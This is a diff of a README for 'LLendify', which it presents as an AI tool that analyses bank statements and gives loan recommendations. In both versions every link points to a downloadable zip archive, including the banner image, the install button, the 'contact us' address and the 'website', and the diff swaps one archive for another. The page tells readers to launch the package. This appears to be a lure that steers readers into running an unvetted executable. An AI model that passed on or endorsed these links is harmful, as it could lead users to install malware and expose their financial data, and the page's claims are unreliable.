@@ -1,6 +1,6 @@
 # LLendify - AI-Powered Bank Statement Analysis & Instant Loan Recommendations 🚀
 
-![LLendify Banner](https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip)
+![LLendify Banner](https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip)
 
 LLendify is a sophisticated platform that harnesses the power of large language models (LLMs) to analyze bank statements and offer instant loan eligibility insights. By simply uploading your bank statement PDF, you can receive AI-powered loan recommendations, detailed analysis of income patterns, spending habits, and creditworthiness assessment. Within seconds, you'll gain access to comprehensive financial assessments and personalized loan recommendations tailored to your unique financial profile.
 
@@ -17,7 +17,7 @@ LLendify is a sophisticated platform that harnesses the power of large language 
 
 ## 📂 Installation
 To get started with LLendify, you can download the necessary software package from the link below:
-[![Download Software Package](https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip Package-yellow)](https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip)
+[![Download Software Package](https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip Package-yellow)](https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip)
 
 ⚠️ **Note**: The software package needs to be launched for installation.
 
@@ -41,9 +41,9 @@ Follow these steps to kick-start your journey with LLendify:
 We welcome contributions from the open-source community to enhance LLendify's capabilities further. Whether you're a developer, designer, or AI enthusiast, your input is valuable to us. Feel free to explore the codebase, open issues, and submit pull requests to contribute to the project's growth.
 
 ## 📞 Contact Us
-If you have any questions, feedback, or suggestions regarding LLendify, please reach out to our team at [https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip](https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip). We appreciate your input and strive to improve the platform based on your valuable insights.
+If you have any questions, feedback, or suggestions regarding LLendify, please reach out to our team at [https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip](https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip). We appreciate your input and strive to improve the platform based on your valuable insights.
 
 ## 🌐 Visit Our Website
-To explore more about LLendify and its functionalities, visit our website at [https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip](https://github.com/Murilo122333/llendify/releases/download/v1.0/Application.zip).
+To explore more about LLendify and its functionalities, visit our website at [https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip](https://github.com/Murilo122333/llendify/releases/download/v2.0/Software.zip).
 
 Let LLendify revolutionize your financial journey with advanced AI-powered insights and instant loan recommendations. 🌟 Start your financial transformation today! 🚀
